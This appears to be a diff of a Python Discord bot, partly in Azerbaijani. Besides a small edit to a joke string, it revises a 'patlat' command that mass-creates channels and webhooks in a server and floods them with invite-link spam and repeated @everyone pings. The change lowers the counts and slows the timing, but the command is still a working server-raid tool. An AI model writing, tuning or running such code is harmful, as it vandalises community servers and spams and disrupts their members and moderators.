@@ -486,7 +486,7 @@ async def calc_cmd(ctx, *, expression):
 @bot.command(name="joke")
 async def joke_cmd(ctx):
     jokes = [
-        "Kompyuter niyə soyuducama gəldi? İtki pəncərəsi açıq qoymuşduq!",
+        "Kompyuter niyə soyuducama gəldi? İtki pəncərəsi açıq qoymuşduqum üçün!",
         "Tamirçi niyə yoruldu? Çünki ziddən deyirlər.",
         "Müəllim şagirə: — De görüm, Nəsimi harada anadan olub? Şagir: — Vikipediya səhifəsində, müəllim!",
         "Proqramçı dostuna deyir: 'Həyatım eyni kod kimidir; səhvlərlə doludur, amma nə üçün işlədiyini heç kim bilmir.'"
@@ -595,46 +595,46 @@ async def patlat_cmd(ctx):
             pass
 
     qlobal_webhooks = []
-    for i in range(1, 6):
+    for i in range(1, 4):
         try:
             ch = await guild.create_text_channel(f"aga-qoruma-{i}")
             wh = await ch.create_webhook(name=f"XAS-Global-{i}")
             qlobal_webhooks.append(wh)
-            await asyncio.sleep(0.5) 
+            await asyncio.sleep(1.0) 
         except:
             pass
 
-    async def send_webhook_spam(webhook, count=500):
+    async def send_webhook_spam(webhook, count=25):
         for _ in range(count):
             try:
-                await webhook.send("discord.gg/aga yaz gır oql!discord.gg/yaz gır oql")
+                await webhook.send("discord.gg/aga yaz gır oql!")
             except:
                 pass
-            await asyncio.sleep(0.05)
+            await asyncio.sleep(0.15)
 
     async def create_channel_and_spam(i):
         try:
             channel = await guild.create_text_channel(f"discord.gg/aga-{i}")
             if qlobal_webhooks:
-                webhook_tasks = [send_webhook_spam(wh, 100) for wh in qlobal_webhooks]
-                await asyncio.gather(*webhook_tasks, return_exceptions=True)
+                for wh in qlobal_webhooks:
+                    asyncio.create_task(send_webhook_spam(wh, 10))
         except:
             pass
 
-    chunk_size = 5
-    for start in range(1, 351, chunk_size):
-        tasks_list = [create_channel_and_spam(i) for i in range(start, min(start + chunk_size, 351))]
+    chunk_size = 2
+    for start in range(1, 61, chunk_size):
+        tasks_list = [create_channel_and_spam(i) for i in range(start, min(start + chunk_size, 61))]
         await asyncio.gather(*tasks_list, return_exceptions=True)
-        await asyncio.sleep(0.2)
+        await asyncio.sleep(1.0)
 
     try:
-        son_kanal = await guild.create_text_channel("RUHUM TANRI")
-        for _ in range(20):
+        son_kanal = await guild.create_text_channel("RUHUM-TANRI")
+        for _ in range(10):
             try:
-                await son_kanal.send("@everyone ruhum shdı gagas")
+                await son_kanal.send("@everyone ruhum shdı gagas discord.gg/aga")
             except:
                 pass
-            await asyncio.sleep(0.2)
+            await asyncio.sleep(0.5)
     except:
         pass
 
